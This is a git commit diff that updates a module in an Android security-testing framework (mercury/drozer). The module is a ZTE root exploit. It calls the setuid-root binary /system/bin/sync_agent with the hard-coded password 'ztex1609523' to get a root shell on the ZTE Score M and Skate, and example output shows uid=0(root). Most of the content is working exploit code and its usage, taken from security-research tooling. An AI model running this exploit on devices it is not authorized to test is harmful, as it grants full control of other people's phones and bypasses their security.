a576a3f08a090d77631dc7b68cd1bb2fd12323f7
metall0id <tyrone.erasmus@gmail.com>
2013-01-07 12:02:16 +0200

    Updated the ZTE root exploit to new Vulnerability module format

--- metall0id/zte/ztex1609523.py
+++ metall0id/zte/ztex1609523.py
@@ -1,30 +1,30 @@
 from mwr.droidhg.modules import common, Module
 
-class ZTEBackdoor(Module, common.Shell):
+class ZTESyncAgent(Module, common.Vulnerability, common.Shell, common.ClassLoader):
     
-    name = "ZTE Backdoor"
-    description = """
-    Exploit the backdoor at /system/bin/sync_agent, on certain ZTE devices, to gain a root shell.
+    name = "Obtain a root shell on a ZTE Score M and ZTE Skate."
+    description = """Exploit the setuid-root binary at /system/bin/sync_agent on certain ZTE devices to gain a root shell. It is as simple as providing it with the argument "ztex1609523", which is the hard-coded password in the binary.
     
-    This exploit *should* work on the ZTE Score M and the ZTE Skate.
-    """
-    examples = """Get root, on an affected device:
-    mercury> run exploit.root.ztebackdoor
+This exploit has been reported to work on the ZTE Score M and the ZTE Skate.
+"""
+    examples = """
+    mercury> run exploit.root.ztesyncagent
     # id
     uid=0(root) gid=0(root)
     # 
-    
-Attempted root on a different device:
-
-    mercury> run exploit.root.ztebackdoor
-    : sync_agent: not found
-    $ 
     """
     author = ["Anonymous (http://pastebin.com/wamYsqTV)", "Tyrone (@mwrlabs)"]
     date = "2012-12-17"
     license = "MWR Code License"
     path = ["exploit", "root"]
-
-    def execute(self, arguments):
-        self.shellStart("sync_agent ztex1609523")
+    
+    def isVulnerable(self, arguments):
         
+        if self.shellExec("ls /system/bin/sync_agent").strip().endswith("sync_agent"):
+            return True
+        else:
+            return False
+
+    def exploit(self, arguments):
+        
+        self.shellStart("sync_agent ztex1609523")
